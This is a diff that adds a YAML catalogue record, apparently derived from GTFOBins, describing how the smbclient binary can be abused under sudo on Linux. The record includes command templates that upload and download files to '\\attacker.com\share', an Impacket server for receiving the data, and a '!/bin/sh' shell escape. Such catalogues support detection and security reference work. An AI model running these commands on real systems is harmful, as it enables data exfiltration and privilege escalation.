@@ -1,0 +1,97 @@
+id: gtfobins/smbclient/upload/sudo
+type: binary
+platform: linux
+name: smbclient
+phases:
+- exfiltration
+- privilege-escalation
+capabilities:
+- file-upload
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file'
+references:
+- https://gtfobins.github.io/gtfobins/smbclient/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        smbclient:
+          functions:
+            download:
+            - code: smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file'
+              contexts:
+                sudo: null
+                unprivileged: null
+              sender:
+                code: smbserver.py -smb2support share .
+                comment: A SMB/CIFS server can be used on the attacker box to receive the data (e.g, using
+                  [Impacket](https://github.com/SecureAuthCorp/impacket)).
+            shell:
+            - code: 'smbclient ''\\host\share''
+
+                !/bin/sh'
+              comment: A valid SMB/CIFS server must be available.
+              contexts:
+                sudo: null
+                unprivileged: null
+            upload:
+            - code: smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file'
+              contexts:
+                sudo: null
+                unprivileged: null
+              receiver:
+                code: smbserver.py -smb2support share .
+                comment: A SMB/CIFS server can be used on the attacker box to receive the data (e.g, using
+                  [Impacket](https://github.com/SecureAuthCorp/impacket)).
+    upstream_url: https://gtfobins.github.io/gtfobins/smbclient/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-upload
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: exfiltration
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:55b1ec445ab5a87c57e45001fcf9152284fddd3ce8ed5b5a53c5e29a9dab6dd9
